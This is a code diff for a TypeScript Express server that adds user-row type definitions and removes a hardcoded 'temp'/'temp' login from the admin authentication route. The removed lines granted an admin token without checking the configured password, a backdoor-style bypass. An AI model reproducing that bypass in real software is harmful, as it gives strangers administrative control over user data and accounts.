@@ -7,6 +7,31 @@ import path from 'path';
 import { config } from './config';
 import { initDb, pool } from './db';
 
+// Type definition for user database row
+interface UserRow {
+  id: number;
+  max_user_id: number;
+  role: 'customer' | 'loader' | 'admin';
+  first_name: string | null;
+  last_name: string | null;
+  username: string | null;
+  rating_sum: number;
+  rating_count: number;
+  is_blocked: boolean;
+  block_reason: string | null;
+  block_until: string | null;
+  created_at: string;
+}
+
+// Type definition for user with additional properties
+interface UserWithStats extends UserRow {
+  rating_count: number;
+  rating_avg: number | null;
+  auctions_count?: number;
+  bids_count?: number;
+  active_orders_count?: number;
+}
+
 // Добавляем логирование в файл
 const logFile = path.join(__dirname, '../logs/app.log');
 if (!fs.existsSync(path.dirname(logFile))) {
@@ -395,16 +420,6 @@ app.get('/admin/auth/status', (_req, res) => {
 app.post('/admin/auth', (req, res) => {
   const login = typeof req.body?.login === 'string' ? req.body.login.trim() : '';
   const password = typeof req.body?.password === 'string' ? req.body.password.trim() : '';
-  
-  // Пропускаем первый вход без проверки пароля
-  if (login === 'temp' && password === 'temp') {
-    if (!config.adminLogin || !config.adminPassword) {
-      return res.status(503).json({ error: 'admin_login_not_configured' });
-    }
-    const token = createAdminToken();
-    return res.json({ token });
-  }
-  
   if (!config.adminLogin || !config.adminPassword) {
     return res.status(503).json({ error: 'admin_login_not_configured' });
   }
@@ -447,7 +462,7 @@ app.get('/admin/users', async (req, res) => {
        from users u where u.role != 'admin'
        order by u.created_at desc`
     );
-    const list = users.rows.map((u) => ({
+    const list = users.rows.map((u: UserRow) => ({
       id: u.id,
       max_user_id: u.max_user_id,
       role: u.role,
@@ -462,7 +477,7 @@ app.get('/admin/users', async (req, res) => {
       block_until: u.block_until
     }));
 
-    const withStats = await Promise.all(list.map(async (u) => {
+    const withStats = await Promise.all(list.map(async (u: UserWithStats) => {
       const auc = await client.query('select count(*) as c from auctions where customer_id = $1', [u.id]);
       const bids = await client.query('select count(*) as c from bids where loader_id = $1', [u.id]);
       const activeAuc = await client.query("select count(*) as c from auctions where customer_id = $1 and status in ('active','paid')", [u.id]);
